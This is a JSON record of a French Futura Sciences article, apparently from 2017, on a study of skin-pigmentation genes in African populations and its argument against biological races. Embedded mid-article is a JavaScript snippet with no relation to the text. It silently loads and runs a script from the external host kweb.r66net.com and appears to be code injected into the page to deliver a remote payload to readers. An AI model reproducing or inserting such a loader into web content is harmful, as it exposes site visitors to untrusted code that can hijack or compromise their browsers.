{"title": "Couleur de peau : les genes refutent la notion de race", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-10-13", "content": "Des chercheurs americains ont etudie les genes impliques dans la couleur de peau chez les Africains. Ils ont trouve que des variants genetiques associes a une peau claire ou a une peau foncee sont presents a la fois en Afrique et dans d'autres populations du monde. Ce qu'il faut retenir Les chercheurs ont etudie les genomes de pres de 1.600 Africains. Ils ont identifie de nouveaux genes impliques dans la pigmentation de la peau. Les variants qui favorisent une peau claire ont une origine africaine. L'humanite se decline dans le monde avec toute une palette de couleurs de  peau . Jusqu'a present, on connaissait peu de  genes  lies a la  pigmentation  de la peau et ceux-ci ont plutot ete decouverts dans des populations europeennes. Or, en Afrique, les habitants n'ont pas tous la meme  couleur  de peau. Quels sont les genes qui expliquent cette diversite ? Pour le savoir, des chercheurs de l'universite de Pennsylvanie ont mesure la reflectance de la peau de plus de 2.000 Africains, en prenant une mesure au niveau du bras. La peau la plus sombre etait celle d'une population d'Afrique de l'est, et la plus claire celle des  chasseurs-cueilleurs  San en Afrique australe.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quatre zones du genome associees aux differences de couleurs de peau Grace aux informations  genetiques  provenant d'environ 1.600 personnes, les chercheurs ont trouve quatre zones du  genome  associees aux differences de couleurs de peau. La region qui ressortait en premier se trouvait autour du gene SLC24A5. Un variant de ce gene est connu pour jouer un role dans la coloration claire de la peau de populations europeennes et d'Asie du sud. Ce variant apparu il y a plus de 30.000 ans se retrouve dans des populations ethiopiennes et tanzaniennes qui ont des ancetres en  Asie  du sud et dans le Moyen-Orient. Ceci suggere que le variant a ete importe de ces regions. Une autre region du genome, contenant le gene MFSD12, etait associee a la pigmentation de la peau. Ce gene est peu exprime dans les peaux depigmentees de personnes souffrant de  vitiligo , une maladie de la pigmentation de la peau. Les chercheurs ont trouve que des mutations dans ou autour de ce gene, qui etaient associees a une pigmentation sombre, etaient frequentes dans des populations sub-sahariennes, mais pas chez les San a la peau plus claire. Ces variants etaient aussi presents dans des populations indiennes et australo-melanesiennes qui ont elles aussi une peau sombre : les memes variants se retrouvent hors d'Afrique ! Les personnes qui ont une peau sombre en Inde du sud, en Australie ou en Nouvelle-Guinee n'auraient pas evolue independamment : elles auraient pu heriter ces variants sombres de populations venues d'Afrique. Les membres de la tribu San vivent en Afrique australe, comme au Botswana. (c) Ian Beatty, Wikipedia, CC BY-SA 2.0                        Des ancetres africains a la peau claire Chez les San, des variants genetiques de MFSD12, OCA2 et HERC2 etaient plus frequents. Or les genes OCA2 et HERC2 ont ete lies aux variations de couleur de peau, des  yeux , des cheveux chez les Europeens.  Dans OCA2, les chercheurs ont identifie un variant courant chez les europeens et les San, qui donnerait une  proteine  plus courte et moins fonctionnelle. Ce gene eclaircirait donc a la fois la peau des Europeens et des  chasseurs-cueilleurs  du Botswana.  Dans cette etude, la plupart des variations genetiques associees avec une peau claire ou foncee sont apparues il y a plus de 300.000 ans. Certaines auraient emerge il y a un million d'annees, bien avant l'apparition de l'Homme moderne ! Or, la version ancienne de ces variants etait souvent celle d'une peau claire. Sarah Tishkoff, professeur a l'universite de Pennsylvanie, a explique dans un  communique  :  << il est donc logique que la couleur de la peau chez les  ancetres  des humains modernes ait pu etre relativement claire. Il est probable que lorsque nous avons perdu les poils couvrant nos corps et que nous nous sommes deplaces des forets vers la savane ouverte, nous avions besoin d'une peau plus foncee. >> En effet, la couleur de peau peut etre liee a une adaptation a l'environnement. Une peau sombre aide a prevenir les consequences negatives de la  lumiere  ultraviolette ( cancer de la peau ) ; une peau claire est plus efficace pour fabriquer de la  vitamine D  dans des regions du monde avec moins d' expositions aux UV . \" Il n'y a pas de race africaine. Ce travail paru dans la revue  Science  montre aussi que la genetique contredit la notion de races :  << il n'y a pas de race africaine. Nous montrons que la couleur de la peau est extremement variable sur le continent africain et qu'elle evolue encore. En outre, dans la plupart des cas, les variants genetiques associes a la peau claire sont apparus en Afrique. >> Le saviez-vous ? Des cellules de la peau, les melanocytes, possedent des poches, les melanosomes, contenant des molecules de pigment. La couleur de la peau varie en fonction du pigment : les melanosomes contiennent des melanges d'un pigment marron-noir (eumelanine) et d'un pigment jaune-rouge (pheomelanine).  L'environnement conditionne-t-il l'evolution de l'Homme ?                       Dans sa theorie de l'evolution, Darwin propose que le moteur la selection naturelle soit la lutte pour la survie (struggle for life). Dans un environnement changeant, l'Homme, comme les autres especes, est soumis a ces lois de l'evolution.                                       ", "theme": "sante"}